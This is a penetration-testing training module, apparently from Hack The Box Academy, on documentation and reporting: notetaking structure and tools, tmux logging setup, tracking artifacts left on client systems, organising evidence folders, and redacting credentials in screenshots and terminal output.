
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">

<h1 id="25-documentation-reporting">25. Documentation &amp; Reporting</h1>
<h3 id="introduction-to-documentation-and-reporting">Introduction to Documentation and Reporting</h3>
<hr>
<p>Strong documentation and reporting skills are incredibly beneficial in any area of Information Technology or Information Security, and mastering these skills can help us quickly progress in our careers. Being highly technical is great and essential, but without soft skills to back up our technical pwning skills, we won&#39;t be as effective whether we are writing internal policies and procedures, technical documentation, penetration test reports, or other types of client deliverables.</p>
<p>There is no &quot;one size fits all&quot; for notetaking and preparing reports, but there are fundamental principles that must be followed to be successful. This module will explore different styles from notetaking tools, organizing our evidence on our testing VM, writing up Executive Summaries for non-technical audiences, and documenting Attack Chains and technical findings. We attempted to provide a generic formula that anyone can use to achieve success while sprinkling in tips, tricks, and best practices that we have learned from around 25 combined years in various client-facing technical consulting and managerial roles.</p>
<p>One crucial consideration for us as testers is a penetration test is a snapshot in time of the target network&#39;s security status. We should include an overview section in our report that talks about the type of work performed, who performed it, source IP addresses used in testing, and any special considerations (i.e., testing performed remotely over VPN or from a host within the client&#39;s network). This overview should also state that our testing was performed during a specific period and that any changes to in-scope systems and resultant vulnerabilities would not be captured in this report deliverable. We could state: &quot;All testing activities were performed between January 7, 2022 and January 19, 2022.&quot; We could also add a disclaimer, such as &quot;This report represents a snapshot in time during the aforementioned testing period, and Acme Consulting, LLC cannot attest to the state of any client-owned information assets outside of this testing window.&quot;</p>
<hr>
<h3 id="documentation-reporting-in-practice">Documentation &amp; Reporting in Practice</h3>
<p>You may be thinking &quot;<code>this will be a boring module.</code>&quot;, or &quot;<code>how could we possibly make an entire course on this topic?</code>&quot;. While documentation and reporting is not the most exciting topic and certainly not as satisfying as pwning a box or getting DA in a lab or real-world network, these are critical skills for anyone in a consulting role. Below are a few examples of times in our careers when neat and thorough documentation and detailed reporting rescued us from what could have escalated into a rather unpleasant situation.</p>
<p><strong>Scenario 1 - The Case of an Exploding VM</strong></p>
<p>During one particularly lengthy engagement (a nearly month-long External Penetration Test), I signed on for the day, and my VM would not load up properly. I spent a while trying to recover the file system, but it was completely gone. Luckily I had been taking excellent, detailed project notes using a local copy of OneNote on my base workstation. My team at the time used a shared storage solution for all projects, and we had an automated script to sync our data to share at the end of testing, both for QA and archive purposes. On a tip from a more senior teammate, I had been backing up my testing evidence to this share at the end of every working day. Therefore once I built a new VM (from a template that I kept), all I had to do was sync my project data, and I was back to testing without any interruptions. If I had not been following a defined process, the result could have been catastrophic, losing weeks of work and potentially losing a client for the company or even my job.</p>
<p><strong>Scenario 2 - Ping of Death</strong></p>
<p>I knew this one Internal Penetration Test would be difficult starting from the initial scoping call. One member of the client&#39;s internal IT team was very hostile and questioned everything, suspicious of the team&#39;s skills, and very protective of a set of critical servers (whose IP addresses were not in the scope of testing). During the enumeration phase of testing, I received an email and call from the client asking to stop all testing as we had brought down multiple critical servers that were sensitive to any type of scanning. I produced all log data, scope files, and timestamped raw scan data. The IP addresses of the affected hosts were in my scans, but they were also included in the scope file, which the client had confirmed. In this case, I had done nothing wrong as I was testing the scope I was given (and confirmed) and had not performed any reckless testing activities. There was a lesson learned that I added to my processes, though. After this, I made sure to ask clients for a specific list of any individual IP addresses and host names that should be explicitly excluded from any scans or other testing activity. In this situation, I had strong documentation to back up what activities had been performed, and written confirmation of the in-scope IP address ranges from the client. However, I found an opportunity to refine my processes further and grow as a consultant.</p>
<p><strong>Scenario 3 - Slow as Molasses</strong></p>
<p>In this last example, I was performing an Internal Penetration Test onsite at a client&#39;s headquarters building, seated in an area of the office where IT staff sat. Seated behind me was a particularly hostile network administrator who had been skeptical of our abilities and tools since the kickoff call, stating that previous penetration tests from other companies had slowed the network down massively due to inexperienced and reckless testers. Less than 20 minutes into testing, this network admin had sent emails to the entire distribution list and came over to my desk telling me that our scans had slowed the network to a halt, and he had blocked our source IP addresses. We then went through an exercise of sharing our scanning output, showing that we had followed best practices and nothing we had done would explain the network slowdown. Another admin, meanwhile, determined that debug mode had been enabled on every network device, which, combined with normal Nmap scans, was enough to overwhelm the devices and cause slowdowns. Once this was disabled, testing proceeded with no issues. In this case, our documentation backed up our actions and forced the customer to investigate further. Had we not had any (or poor) documentation, then the blame could have easily been placed on us, and it could have greatly impacted the client relationship and our reputation.</p>
<p>These stories illustrate the importance of strong documentation. We need to be able to justify our actions and, if asked, be able to produce evidence for the client to attempt to troubleshoot an issue. It is not uncommon for any network issues during a penetration test to be blamed on the tester regardless of whether it is a result of their activities. We want to be in a strong position to cover ourselves and assist our clients. Furthermore, we never want to scramble to re-do testing after losing evidence or ask a client for more time because we were not diligent in our notetaking and organization.</p>
<hr>
<h3 id="about-this-module">About this Module</h3>
<p>We&#39;ve included a sample Obsidian notebook and a sample Internal Penetration Test report (in both MS Word and PDF formats - zip password <code>hackthebox</code>) that can be downloaded from the <code>Resources</code> tab in the top right of this or any other module section. These are great supplementary resources to keep for yourselves but also helpful to have on hand while working through the content.</p>
<p>There are many opportunities in this module to practice the skills being taught, but none of them are mandatory to complete the module. To get the most value out of this module, we recommend (obviously) taking detailed notes and using the tips and tricks to see where there may be holes or inefficiencies in your processes. Once you figure this out, we hope you will find ways to be more productive and reduce the reporting burden because, let&#39;s be honest, no one enjoys reporting; we tolerate it as a necessary evil. Once you are done with this module, it is worth practicing these tips on real-world engagements, or, if you&#39;re not yet working in a consulting role, practice your documentation and reporting skills against training targets and labs.</p>
<p>We include a pre-configured attack host and a small lab with this module that you can use to simulate an Internal Penetration Test. Take advantage of this and use it to practice as much as you want until you are comfortable identifying all the findings and develop a documentation style that fits your workflow.</p>
<p>Throughout the module you may see us throwing around terms like &quot;an internal&quot; or &quot;an external&quot;. In these cases we are referring to an Internal Penetration Test or External Penetration Test, respectively.</p>
<p>We&#39;ve tried to make this typically dull topic more engaging than usual, so strap in. It&#39;s going to be a wild ride down the rabbit hole of documentation and reporting!</p>
<h2 id="notetaking-organization">Notetaking &amp; Organization</h2>
<hr>
<p>Thorough notetaking is critical during any assessment. Our notes, accompanied by tool and log output, are the raw inputs to our draft report, which is typically the only portion of our assessment that our client sees. Even though we usually keep our notes for ourselves, we must keep things organized and develop a repeatable process to save time and facilitate the reporting process. Detailed notes are also a must in the event of a network issue or client question (i.e., did you scan X host on Y day?), so being overly verbose in our notetaking never hurts. Everyone will have their own style they are comfortable with and should work with their preferred tools and organizational structure to ensure the best possible results. In this module, we will cover the minimum elements that, from our professional experience, should be noted down during an assessment (or even while working through a large module, playing a box on HTB, or taking an exam) to save time and energy come reporting time or as a reference guide down the road. If you&#39;re part of a larger team where someone may have to cover a client meeting for you, clear and consistent notes are essential to ensure your teammate can speak confidently and accurately about what activities were and were not performed.</p>
<hr>
<h3 id="notetaking-sample-structure">Notetaking Sample Structure</h3>
<p>There is no universal solution or structure for notetaking as each project and tester is different. The structure below is what we have found to be helpful but should be adapted to your personal workflow, project type, and the specific circumstances you encountered during your project. For example, some of these categories may not be applicable for an application-focused assessment and may even warrant additional categories not listed here.</p>
<ul>
<li><code>Attack Path</code> - An outline of the entire path if you gain a foothold during an external penetration test or compromise one or more hosts (or the AD domain) during an internal penetration test. Outline the path as closely as possible using screenshots and command output will make it easier to paste into the report later and only need to worry about formatting.</li>
<li><code>Credentials</code> - A centralized place to keep your compromised credentials and secrets as you go along.</li>
<li><code>Findings</code> - We recommend creating a subfolder for each finding and then writing our narrative and saving it in the folder along with any evidence (screenshots, command output). It is also worth keeping a section in your notetaking tool for recording findings information to help organize them for the report.</li>
<li><code>Vulnerability Scan Research</code> - A section to take notes on things you&#39;ve researched and tried with your vulnerability scans (so you don&#39;t end up redoing work you already did).</li>
<li><code>Service Enumeration Research</code> - A section to take notes on which services you&#39;ve investigated, failed exploitation attempts, promising vulnerabilities/misconfigurations, etc.</li>
<li><code>Web Application Research</code> - A section to note down interesting web applications found through various methods, such as subdomain brute-forcing. It&#39;s always good to perform thorough subdomain enumeration externally, scan for common web ports on internal assessments, and run a tool such as Aquatone or EyeWitness to screenshot all applications. As you review the screenshot report, note down applications of interest, common/default credential pairs you tried, etc.</li>
<li><code>AD Enumeration Research</code> - A section for showing, step-by-step, what Active Directory enumeration you&#39;ve already performed. Note down any areas of interest you need to run down later in the assessment.</li>
<li><code>OSINT</code> - A section to keep track of interesting information you&#39;ve collected via OSINT, if applicable to the engagement.</li>
<li><code>Administrative Information</code> - Some people may find it helpful to have a centralized location to store contact information for other project stakeholders like Project Managers (PMs) or client Points of Contact (POCs), unique objectives/flags defined in the Rules of Engagement (RoE), and other items that you find yourself often referencing throughout the project. It can also be used as a running to-do list. As ideas pop up for testing that you need to perform or want to try but don&#39;t have time for, be diligent about writing them down here so you can come back to them later.</li>
<li><code>Scoping Information</code> - Here, we can store information about in-scope IP addresses/CIDR ranges, web application URLs, and any credentials for web applications, VPN, or AD provided by the client. It could also include anything else pertinent to the scope of the assessment so we don&#39;t have to keep re-opening scope information and ensure that we don&#39;t stray from the scope of the assessment.</li>
<li><code>Activity Log</code> - High-level tracking of everything you did during the assessment for possible event correlation.</li>
<li><code>Payload Log</code> - Similar to the activity log, tracking the payloads you&#39;re using (and a file hash for anything uploaded and the upload location) in a client environment is critical. More on this later.</li>
</ul>
<hr>
<h3 id="notetaking-tools">Notetaking Tools</h3>
<p>There are many tools available for notetaking, and the choice is very much personal preference. Here are some of the options available:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://www.giuspen.com/cherrytree/">CherryTree</a></td>
<td><a href="https://code.visualstudio.com/">Visual Studio Code</a></td>
<td><a href="https://evernote.com/">Evernote</a></td>
</tr>
<tr>
<td><a href="https://www.notion.so/">Notion</a></td>
<td><a href="https://www.gitbook.com/">GitBook</a></td>
<td><a href="https://www.sublimetext.com/">Sublime Text</a></td>
</tr>
<tr>
<td><a href="https://notepad-plus-plus.org/downloads/">Notepad++</a></td>
<td><a href="https://www.onenote.com/?public=1">OneNote</a></td>
<td><a href="https://www.getoutline.com/">Outline</a></td>
</tr>
<tr>
<td><a href="https://obsidian.md/">Obsidian</a></td>
<td><a href="https://cryptpad.fr/">Cryptpad</a></td>
<td><a href="https://standardnotes.com/">Standard Notes</a></td>
</tr>
</tbody>
</table>
<p>As a team, we&#39;ve had many discussions about the pros and cons of various notetaking tools. One key factor is distinguishing between local and cloud solutions before choosing a tool. A cloud solution is likely acceptable for training courses, CTFs, labs, etc., but once we get into engagements and managing client data, we must be more careful with the solution we choose. Your company will likely have some sort of policy or contractual obligations around data storage, so it is best to consult with your manager or team lead on whether or not using a specific notetaking tool is permitted. <code>Obsidian</code> is an excellent solution for local storage, and <code>Outline</code> is great for the cloud but also has a <a href="https://github.com/outline/outline">Self-hosted version</a>. Both tools can be exported to Markdown and imported into any other tool that accepts this convenient format.</p>
<p><strong>Obsidian</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/notetaking.png" alt="image"></p>
<p>Again, tools are personal preferences from person to person. Requirements typically vary from company to company, so experiment with different options and find one that you are comfortable with and practice with different setups and formats while working through Academy modules, HTB boxes, Pro Labs, and other pieces of training to get comfortable with your notetaking style while remaining as thorough as possible.</p>
<hr>
<h3 id="logging">Logging</h3>
<p>It is essential that we log all scanning and attack attempts and keep raw tool output wherever possible. This will greatly help us come reporting time. Though our notes should be clear and extensive, we may miss something, and having our logs to fallback can help us when either adding more evidence to a report or responding to a client question.</p>
<p><strong>Exploitation Attempts</strong></p>
<p><a href="https://github.com/tmux-plugins/tmux-logging">Tmux logging</a> is an excellent choice for terminal logging, and we should absolutely be using <code>Tmux</code> along with logging as this will save every single thing that we type into a Tmux pane to a log file. It is also essential to keep track of exploitation attempts in case the client needs to correlate events later on (or in a situation where there are very few findings and they have questions about the work performed). It is supremely embarrassing if you cannot produce this information, and it can make you look inexperienced and unprofessional as a penetration tester. It can also be a good practice to keep track of things you tried during the assessment but did not work. This is especially useful for those instances in which we have little to no findings in your report. In this case, we can write up a narrative of the types of testing performed, so the reader can understand the kinds of things they are adequately protected against. We can set up Tmux logging on our system as follows:</p>
<p>First, clone the <a href="https://github.com/tmux-plugins/tpm">Tmux Plugin Manager</a> repo to our home directory (in our case <code>/home/htb-student</code> or just <code>~</code>).</p>
<p>Notetaking &amp; Organization</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ git clone https:/</span><span class="hljs-regexp">/github.com/</span>tmux-plugins<span class="hljs-regexp">/tpm ~/</span>.tmux<span class="hljs-regexp">/plugins/</span>tpm
</code></pre>
<p>Next, create a <code>.tmux.conf</code> file in the home directory.</p>
<p>Notetaking &amp; Organization</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ touch <span class="hljs-selector-class">.tmux</span><span class="hljs-selector-class">.conf</span>
</code></pre>
<p>The config file should have the following contents:</p>
<p>Notetaking &amp; Organization</p>
<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-symbol">$</span> cat .tmux.conf 

# List of plugins

<span class="hljs-keyword">set</span> -g <span class="hljs-comment">@plugin</span> <span class="hljs-comment">'tmux-plugins/tpm'</span>
<span class="hljs-keyword">set</span> <span class="hljs-comment">-g @plugin</span> <span class="hljs-comment">'tmux-plugins/tmux-sensible'</span>
<span class="hljs-keyword">set</span> <span class="hljs-comment">-g @plugin</span> <span class="hljs-comment">'tmux-plugins/tmux-logging'</span>

# Initialize <span class="hljs-comment">TMUX plugin manager (keep at bottom)</span>
run <span class="hljs-comment">'~/.tmux/plugins/tpm/tpm'</span>
</code></pre>
<p>After creating this config file, we need to execute it in our current session, so the settings in the <code>.tmux.conf</code> file take effect. We can do this with the <a href="https://www.geeksforgeeks.org/source-command-in-linux-with-examples/">source</a> command.</p>
<p>Notetaking &amp; Organization</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ tmux source ~/<span class="hljs-selector-class">.tmux</span><span class="hljs-selector-class">.conf</span>
</code></pre>
<p>Next, we can start a new Tmux session (i.e., <code>tmux new -s setup</code>).</p>
<p>Once in the session, type <code>[Ctrl] + [B]</code> and then hit <code>[Shift] + [I]</code> (or <code>prefix</code> + <code>[Shift] + [I]</code> if you are not using the default prefix key), and the plugin will install (this could take around 5 seconds to complete).</p>
<p>Once the plugin is installed, start logging the current session (or pane) by typing <code>[Ctrl] + [B]</code> followed by <code>[Shift] + [P]</code> (<code>prefix</code> + <code>[Shift] + [P]</code>) to begin logging. If all went as planned, the bottom of the window will show that logging is enabled and the output file. To stop logging, repeat the <code>prefix</code> + <code>[Shift] + [P]</code> key combo or type <code>exit</code> to kill the session. Note that the log file will only be populated once you either stop logging or exit the Tmux session.</p>
<p>Once logging is complete, you can find all commands and output in the associated log file. See the demo below for a short visual on starting and stopping Tmux logging and viewing the results.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/tmux\_log\_enable.gif" alt="image"></p>
<p>If we forget to enable Tmux logging and are deep into a project, we can perform retroactive logging by typing <code>[Ctrl] + [B]</code> and then hitting <code>[Alt] + [Shift] + [P]</code> (<code>prefix</code> + <code>[Alt] + [Shift] + [P]</code>), and the entire pane will be saved. The amount of saved data depends on the Tmux <code>history-limit</code> or the number of lines kept in the Tmux scrollback buffer. If this is left at the default value and we try to perform retroactive logging, we will most likely lose data from earlier in the assessment. To safeguard against this situation, we can add the following lines to the <code>.tmux.conf</code> file (adjusting the number of lines as we please):</p>
<p><strong>Tmux.conf</strong></p>
<p>Notetaking &amp; Organization</p>
<pre><code class="lang-shell-session"><span class="hljs-built_in">set</span> -g <span class="hljs-built_in">history</span>-limit 50000
</code></pre>
<p>Another handy trick is the ability to take a screen capture of the current Tmux window or an individual pane. Let&#39;s say we are working with a split window (2 panes), one with <code>Responder</code> and one with <code>ntlmrelayx.py</code>. If we attempt to copy/paste the output from one pane, we will grab data from the other pane along with it, which will look very messy and require cleanup. We can avoid this by taking a screen capture as follows: <code>[Ctrl] + [B]</code> followed by <code>[Alt] + [P]</code> (<code>prefix</code> + <code>[Alt] + [P]</code>). Let&#39;s see a quick demo.</p>
<p>Here we can see we&#39;re working with two panes. If we try to copy text from one pane, we&#39;ll grab text from the other pane, which would make a mess of the output. But, with Tmux logging enabled, we can take a capture of the pane and output it neatly to a file.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/tmux\_pane\_capture.gif" alt="image"></p>
<p>To recreate the above example first start a new tmux session: <code>tmux new -s sessionname</code>. Once in the session type <code>[Ctrl] + [B]</code> + <code>[Shift] + [%]</code> (<code>prefix</code> + <code>[Shift] + [%]</code>) to split the panes vertically (replace the <code>[%]</code> with <code>[&quot;]</code> to do a horizontal split). We can then move from pane to pane by typing <code>[Ctrl] + [B]</code> + <code>[O]</code> (<code>prefix</code> + <code>[O]</code>).</p>
<p>Finally, we can clear the pane history by typing <code>[Ctrl] + [B]</code> followed by <code>[Alt] + [C]</code> (<code>prefix</code> + <code>[Alt] + [C]</code>).</p>
<p>There are many other things we can do with Tmux, customizations we can do with Tmux logging (i.e. <a href="https://github.com/tmux-plugins/tmux-logging/blob/master/docs/configuration.md">changing the default logging path</a>, changing key bindings, running multiple windows within sessions and panes within those windows, etc). It is worth reading up on all the capabilities that Tmux offers and finding out how the tool best fits your workflow. Finally, here are some additional plugins that we like:</p>
<ul>
<li><a href="https://github.com/tmux-plugins/tmux-sessionist">tmux-sessionist</a> - Gives us the ability to manipulate Tmux sessions from within a session: switching to another session, creating a new named session, killing a session without detaching Tmux, promote the current pane to a new session, and more.</li>
<li><a href="https://github.com/tmux-plugins/tmux-pain-control">tmux-pain-control</a> - A plugin for controlling panes and providing more intuitive key bindings for moving around, resizing, and splitting panes.</li>
<li><a href="https://github.com/tmux-plugins/tmux-resurrect">tmux-resurrect</a> - This extremely handy plugin allows us to restore our Tmux environment after our host restarts. Some features include restoring all sessions, windows, panes, and their order, restoring running programs in a pane, restoring Vim sessions, and more.</li>
</ul>
<p>Check out the complete <a href="https://github.com/tmux-plugins/list">tmux plugins list</a> to see if others would fit nicely into your workflow. For more on Tmux, check out this excellent <a href="https://www.youtube.com/watch?v=Lqehvpe\_djs">video</a> by Ippsec and this <a href="https://mavericknerd.github.io/knowledgebase/ippsec/tmux/">cheat sheet</a> based on the video.</p>
<hr>
<h3 id="artifacts-left-behind">Artifacts Left Behind</h3>
<p>At a minimum, we should be tracking when a payload was used, which host it was used on, what file path it was placed in on the target, and whether it was cleaned up or needs to be cleaned up by the client. A file hash is also recommended for ease of searching on the client&#39;s part. It&#39;s best practice to provide this information even if we delete any web shells, payloads, or tools.</p>
<p><strong>Account Creation/System Modifications</strong></p>
<p>If we create accounts or modify system settings, it should be evident that we need to track those things in case we cannot revert them once the assessment is complete. Some examples of this include:</p>
<ul>
<li>IP address of the host(s)/hostname(s) where the change was made</li>
<li>Timestamp of the change</li>
<li>Description of the change</li>
<li>Location on the host(s) where the change was made</li>
<li>Name of the application or service that was tampered with</li>
<li>Name of the account (if you created one) and perhaps the password in case you are required to surrender it</li>
</ul>
<p>It should go without saying, but as a professional and to prevent creating enemies out of the infrastructure team, you should get written approval from the client before making these types of system modifications or doing any sort of testing that might cause an issue with system stability or availability. This can typically be ironed out during the project kickoff call to determine the threshold beyond which the client is willing to tolerate without being notified.</p>
<hr>
<h3 id="evidence">Evidence</h3>
<p>No matter the assessment type, our client (typically) does not care about the cool exploit chains we pull off or how easily we &quot;pwned&quot; their network. Ultimately, they are paying for the report deliverable, which should clearly communicate the issues discovered and evidence that can be used for validation and reproduction. Without clear evidence, it can be challenging for internal security teams, sysadmins, devs, etc., to reproduce our work while working to implement a fix or even to understand the nature of the issue.</p>
<p><strong>What to Capture</strong></p>
<p>As we know, each finding will need to have evidence. It may also be prudent to collect evidence of tests that were performed that were unsuccessful in case the client questions your thoroughness. If you&#39;re working on the command line, Tmux logs may be sufficient evidence to paste into the report as literal terminal output, but they can be horribly formatted. For this reason, capturing your terminal output for significant steps as you go along and tracking that separately alongside your findings is a good idea. For everything else, screenshots should be taken.</p>
<p><strong>Storage</strong></p>
<p>Much like with our notetaking structure, it&#39;s a good idea to come up with a framework for how we organize the data collected during an assessment. This may seem like overkill on smaller assessments, but if we&#39;re testing in a large environment and don&#39;t have a structured way to keep track of things, we&#39;re going to end up forgetting something, violating the rules of engagement, and probably doing things more than once which can be a huge time waster, especially during a time-boxed assessment. Below is a suggested baseline folder structure, but you may need to adapt it accordingly depending on the type of assessment you&#39;re performing or unique circumstances.</p>
<ul>
<li><code>Admin</code><ul>
<li>Scope of Work (SoW) that you&#39;re working off of, your notes from the project kickoff meeting, status reports, vulnerability notifications, etc</li>
</ul>
</li>
<li><code>Deliverables</code><ul>
<li>Folder for keeping your deliverables as you work through them. This will often be your report but can include other items such as supplemental spreadsheets and slide decks, depending on the specific client requirements.</li>
</ul>
</li>
<li><code>Evidence</code><ul>
<li>Findings<ul>
<li>We suggest creating a folder for each finding you plan to include in the report to keep your evidence for each finding in a container to make piecing the walkthrough together easier when you write the report.</li>
</ul>
</li>
<li>Scans<ul>
<li>Vulnerability scans<ul>
<li>Export files from your vulnerability scanner (if applicable for the assessment type) for archiving.</li>
</ul>
</li>
<li>Service Enumeration<ul>
<li>Export files from tools you use to enumerate services in the target environment like Nmap, Masscan, Rumble, etc.</li>
</ul>
</li>
<li>Web<ul>
<li>Export files for tools such as ZAP or Burp state files, EyeWitness, Aquatone, etc.</li>
</ul>
</li>
<li>AD Enumeration<ul>
<li>JSON files from BloodHound, CSV files generated from PowerView or ADRecon, Ping Castle data, Snaffler log files, CrackMapExec logs, data from Impacket tools, etc.</li>
</ul>
</li>
</ul>
</li>
<li>Notes<ul>
<li>A folder to keep your notes in.</li>
</ul>
</li>
<li>OSINT<ul>
<li>Any OSINT output from tools like Intelx and Maltego that doesn&#39;t fit well in your notes document.</li>
</ul>
</li>
<li>Wireless<ul>
<li>Optional if wireless testing is in scope, you can use this folder for output from wireless testing tools.</li>
</ul>
</li>
<li>Logging output<ul>
<li>Logging output from Tmux, Metasploit, and any other log output that does not fit the <code>Scan</code> subdirectories listed above.</li>
</ul>
</li>
<li>Misc Files<ul>
<li>Web shells, payloads, custom scripts, and any other files generated during the assessment that are relevant to the project.</li>
</ul>
</li>
</ul>
</li>
<li><code>Retest</code><ul>
<li>This is an optional folder if you need to return after the original assessment and retest the previously discovered findings. You may want to replicate the folder structure you used during the initial assessment in this directory to keep your retest evidence separate from your original evidence.</li>
</ul>
</li>
</ul>
<p>It&#39;s a good idea to have scripts and tricks for setting up at the beginning of an assessment. We could take the following command to make our directories and subdirectories and adapt it further.</p>
<p>Notetaking &amp; Organization</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ mkdir -p ACME-IPT/</span>{Admin,Deliverables,Evidence<span class="hljs-regexp">/{Findings,Scans/</span>{Vuln,Service,Web,<span class="hljs-string">'AD Enumeration'</span>},Notes,OSINT,Wireless,<span class="hljs-string">'Logging output'</span>,<span class="hljs-string">'Misc Files'</span>},Retest}
</code></pre>
<p>Notetaking &amp; Organization</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ tree ACME-IPT/</span>

ACME-IPT/
├── Admin
├── Deliverables
├── Evidence
│   ├── Findings
│   ├── Logging output
│   ├── Misc Files
│   ├── Notes
│   ├── OSINT
│   ├── Scans
│   │   ├── AD Enumeration
│   │   ├── Service
│   │   ├── Vuln
│   │   └── Web
│   └── Wireless
└── Retest
</code></pre>
<p>A nice feature of a tool such as Obsidian is that we can combine our folder structure and notetaking structure. This way, we can interact with the notes/folders directly from the command line or inside the Obsidian tool. Here we can see the general folder structure working through Obsidian.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/notetaking2.png" alt="image"></p>
<p>Drilling down further, we can see the benefits of combining our notetaking and folder structure. During a real assessment, we may add additional pages/folders or remove some, a page and a folder for each finding, etc.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/notetaking3.png" alt="image"></p>
<p>Taking a quick look at the directory structure, we can see each folder we created previously and some now populated with Obsidian Markdown pages.</p>
<p>Notetaking &amp; Organization</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ tree
.
└── Inlanefreight Penetration Test
    ├── Admin
    ├── Deliverables
    ├── Evidence
    │   ├── Findings
    │   │   ├── H1 - Kerberoasting<span class="hljs-selector-class">.md</span>
    │   │   ├── H2 - ASREPRoasting<span class="hljs-selector-class">.md</span>
    │   │   ├── H3 - LLMNR&amp;NBT-NS Response Spoofing<span class="hljs-selector-class">.md</span>
    │   │   └── H4 - Tomcat Manager Weak Credentials<span class="hljs-selector-class">.md</span>
    │   ├── Logging output
    │   ├── Misc files
    │   ├── Notes
    │   │   ├── <span class="hljs-number">10</span>. AD Enumeration Research<span class="hljs-selector-class">.md</span>
    │   │   ├── <span class="hljs-number">11</span>. Attack Path<span class="hljs-selector-class">.md</span>
    │   │   ├── <span class="hljs-number">12</span>. Findings<span class="hljs-selector-class">.md</span>
    │   │   ├── <span class="hljs-number">1</span>. Administrative Information<span class="hljs-selector-class">.md</span>
    │   │   ├── <span class="hljs-number">2</span>. Scoping Information<span class="hljs-selector-class">.md</span>
    │   │   ├── <span class="hljs-number">3</span>. Activity Log<span class="hljs-selector-class">.md</span>
    │   │   ├── <span class="hljs-number">4</span>. Payload Log<span class="hljs-selector-class">.md</span>
    │   │   ├── <span class="hljs-number">5</span>. OSINT Data<span class="hljs-selector-class">.md</span>
    │   │   ├── <span class="hljs-number">6</span>. Credentials<span class="hljs-selector-class">.md</span>
    │   │   ├── <span class="hljs-number">7</span>. Web Application Research<span class="hljs-selector-class">.md</span>
    │   │   ├── <span class="hljs-number">8</span>. Vulnerability Scan Research<span class="hljs-selector-class">.md</span>
    │   │   └── <span class="hljs-number">9</span>. Service Enumeration Research<span class="hljs-selector-class">.md</span>
    │   ├── OSINT
    │   ├── Scans
    │   │   ├── AD Enumeration
    │   │   ├── Service
    │   │   ├── Vuln
    │   │   └── Web
    │   └── Wireless
    └── Retest

<span class="hljs-number">16</span> directories, <span class="hljs-number">16</span> files
</code></pre>
<p>Reminder: The folder and notetaking structure shown above is what has worked for us in our careers but will differ from person to person and engagement to engagement. We encourage you to try this out as a base, see how it works for you, and use it as a basis for coming up with a style that works for you. What&#39;s important is that we are thorough and organized, and there is no singular way to approach this. Obsidian is a great tool, and this format is clean, easy to follow, and easily reproducible from engagement to engagement. You could create a script to create the directory structure and the initial 10 Markdown files. You will get a chance to play around with this sample structure via GUI access to a Parrot VM at the end of this section.</p>
<hr>
<h3 id="formatting-and-redaction">Formatting and Redaction</h3>
<p>Credentials and Personal Identifiable Information (<code>PII</code>) should be redacted in screenshots and anything that would be morally objectionable, like graphic material or perhaps obscene comments and language. You may also consider the following:</p>
<ul>
<li>Adding annotations to the image like arrows or boxes to draw attention to the important items in the screenshot, particularly if a lot is happening in the image (don&#39;t do this in MS Word).</li>
<li>Adding a minimal border around the image to make it stand out against the white background of the document.</li>
<li>Cropping the image to only display the relevant information (e.g., instead of a full-screen capture, just to show a basic login form).</li>
<li>Include the address bar in the browser or some other information indicating what URL or host you&#39;re connected to.</li>
</ul>
<p><strong>Screenshots</strong></p>
<p>Wherever possible, we should try to use terminal output over screenshots of the terminal. It is easier to redact, highlight the important parts (i.e., the command we ran in blue text and the part of the output we want to call attention to in red), typically looks neater in the document, and can avoid the document from becoming a massive, unwieldy file if we have loads of findings. We should be careful not to alter terminal output since we want to give an exact representation of the command we ran and the result. It is OK to shorten/cut out unnecessary output and mark the removed portion with <code>&lt;SNIP&gt;</code> but never alter output or add things that were not in the original command or output. Using text-based figures also makes it easier for the client to copy/paste to reproduce your results. It&#39;s also important that the source material that you&#39;re pasting <em>from</em> has all formatting stripped before going into your Word document. If you&#39;re pasting text that has embedded formatting, you may end up pasting non-UTF-8 encoded characters into your commands (usually alternate quotes or apostrophes), which may actually cause the command to not work correctly when the client tries to reproduce it.</p>
<p>One common way of redacting screenshots is through pixelation or blurring using a tool such as Greenshot. <a href="https://www.bleepingcomputer.com/news/security/researcher-reverses-redaction-extracts-words-from-pixelated-image/">Research</a> has shown that this method is not foolproof, and there&#39;s a high likelihood that the original data could be recovered by reversing the pixelation/blurring technique. This can be done with a tool such as <a href="https://github.com/bishopfox/unredacter">Unredacter</a>. Instead, we should avoid this technique and use black bars (or another solid shape) over the text we would like to redact. We should edit the image directly and not just apply a shape in MS Word, as someone with access to the document could easily delete this. As an aside, if you are writing a blog post or something published on the web with redacted sensitive data, do not rely on HTML/CSS styling to attempt to obscure the text (i.e., black text with a black background) as this can easily be viewed by highlighting the text or editing the page source temporarily. When in doubt, use console output but if you must use a terminal screenshot, then make sure you are appropriately redacting information. Below are examples of the two techniques:</p>
<p><strong>Blurring Password Data</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/blurred.png" alt="image"></p>
<p><strong>Blanking Out Password with Solid Shape</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/boxes.png" alt="image"></p>
<p>Finally, here is a suggested way to present terminal evidence in a report document. Here we have preserved the original command and output but enhanced it to highlight both the command and the output of interest (successful authentication).</p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/terminal\_output.png" alt="image"></p>
<p>The way we present evidence will differ from report to report. We may be in a situation where we cannot copy/paste console output, so we must rely on a screenshot. The tips here are intended to provide options for creating a neat but accurate report with all evidence represented adequately.</p>
<p><strong>Terminal</strong></p>
<p>Typically the only thing that needs to be redacted from terminal output is credentials (whether in the command itself or the output of the command). This includes password hashes. For password hashes, you can usually just strip out the middle of them and leave the first and last 3 or 4 characters to show there was actually a hash there. For cleartext credentials or any other human-readable content that needs to be obfuscated, you can just replace it with a <code>&lt;REDACTED&gt;</code> or <code>&lt;PASSWORD REDACTED&gt;</code> placeholder, or similar.</p>
